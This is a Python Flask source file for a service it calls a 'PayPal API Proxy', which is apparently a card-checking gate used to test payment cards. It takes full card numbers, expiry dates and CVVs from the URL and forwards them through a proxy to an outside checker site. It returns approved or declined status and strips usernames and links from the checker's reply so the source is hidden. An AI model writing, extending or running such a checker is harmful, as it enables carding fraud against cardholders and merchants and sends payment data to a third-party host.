from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

# Configuration
TARGET_API_BASE = "https://paypal.cxchk.site/gate=pp1"
PROXY_CONFIG = "TITS.OOPS.WTF:6969:asyncio:requests"

def sanitize_response(text):
    """
    Remove usernames, links, and @ mentions from response text
    """
    # Remove @mentions (usernames)
    text = re.sub(r'@\w+', '', text)
    
    # Remove URLs
    text = re.sub(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', '', text)
    
    # Remove common link patterns
    text = re.sub(r'www\.\w+\.\w+', '', text)
    
    return text.strip()

def parse_cc_parameter(cc_param):
    """
    Parse CC parameter in different formats (with | separator)
    Returns: cc, mm, yyyy, cvv
    """
    parts = cc_param.split('|')
    
    if len(parts) == 4:
        cc, mm, yyyy_or_yy, cvv = parts
        
        # Handle year format (yy or yyyy)
        if len(yyyy_or_yy) == 2:
            yyyy = f"20{yyyy_or_yy}"  # Assuming 21st century
        else:
            yyyy = yyyy_or_yy
            
        return cc, mm, yyyy, cvv
    
    return None, None, None, None

@app.route('/paypal$1/gate=pp/cc=<path:cc_param>')
def process_credit_card(cc_param):
    """
    Main endpoint that processes credit card requests
    """
    try:
        # Parse the CC parameter
        cc, mm, yyyy, cvv = parse_cc_parameter(cc_param)
        
        if not all([cc, mm, yyyy, cvv]):
            return jsonify({
                "code": "INVALID_PARAMETERS",
                "message": "Invalid credit card parameter format. Use: cc|mm|yyyy|cvv or cc|mm|yy|cvv",
                "status": "declined"
            }), 400
        
        # Build the target URL
        target_url = f"{TARGET_API_BASE}/cc={cc}|{mm}|{yyyy}|{cvv}?proxy={PROXY_CONFIG}"
        
        # Make request to target API
        response = requests.get(target_url, timeout=30)
        
        if response.status_code == 200:
            # Sanitize the response
            sanitized_content = sanitize_response(response.text)
            
            # Try to parse JSON response
            try:
                api_data = response.json()
                
                # Extract code and status from the API response
                code = api_data.get('code', 'UNKNOWN_ERROR')
                status = api_data.get('status', 'declined')
                message = api_data.get('message', '')
                
                # Sanitize message if it exists
                if message:
                    message = sanitize_response(message)
                
            except ValueError:
                # If response is not JSON, use the sanitized text
                code = "TEXT_RESPONSE"
                status = "processed"
                message = sanitized_content
            
            # Return formatted response
            return jsonify({
                "cc": f"{cc}|{mm}|{yyyy}|{cvv}",
                "response": message,
                "status": status,
                "code": code
            })
            
        else:
            return jsonify({
                "code": "API_ERROR",
                "message": f"Target API returned status {response.status_code}",
                "status": "error"
            }), 502
            
    except requests.exceptions.Timeout:
        return jsonify({
            "code": "TIMEOUT_ERROR",
            "message": "Request to target API timed out",
            "status": "error"
        }), 504
        
    except requests.exceptions.RequestException as e:
        return jsonify({
            "code": "NETWORK_ERROR",
            "message": f"Network error: {str(e)}",
            "status": "error"
        }), 503
        
    except Exception as e:
        return jsonify({
            "code": "INTERNAL_ERROR",
            "message": f"Internal server error: {str(e)}",
            "status": "error"
        }), 500

@app.route('/health')
def health_check():
    """
    Health check endpoint for monitoring
    """
    return jsonify({"status": "healthy", "service": "PayPal API Proxy"})

@app.route('/')
def home():
    """
    Home endpoint with usage information
    """
    return jsonify({
        "service": "PayPal API Proxy",
        "usage": "/paypal$1/gate=pp/cc=CC|MM|YYYY|CVV",
        "example": "/paypal$1/gate=pp/cc=4546177184967023|01|2028|222"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
